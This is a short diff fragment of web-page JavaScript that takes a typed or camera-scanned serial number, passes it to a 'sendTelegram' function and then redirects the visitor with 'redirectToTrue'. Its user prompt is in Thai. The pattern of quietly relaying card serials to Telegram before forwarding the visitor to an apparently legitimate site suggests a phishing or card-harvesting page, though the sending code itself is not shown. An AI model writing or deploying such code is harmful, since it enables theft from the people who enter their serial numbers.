+  const serial=document.getElementById('manualSerial').value.replace(/\D/g,'');
+  if(serial.length<10){toast('กรุณากรอกเลขซีเรียลให้ครบ');return;}
+  document.getElementById('btnSubmit').disabled=true;
+  sendTelegram(serial);
+  setTimeout(()=>redirectToTrue(serial),300);
 }
+
+// Auto-start
+window.addEventListener('load',()=>{
+  const try_=()=>{ if(typeof ZXing!=='undefined') startCamera(); else setTimeout(try_,200); };
+  setTimeout(try_,500);
+});
 </script>
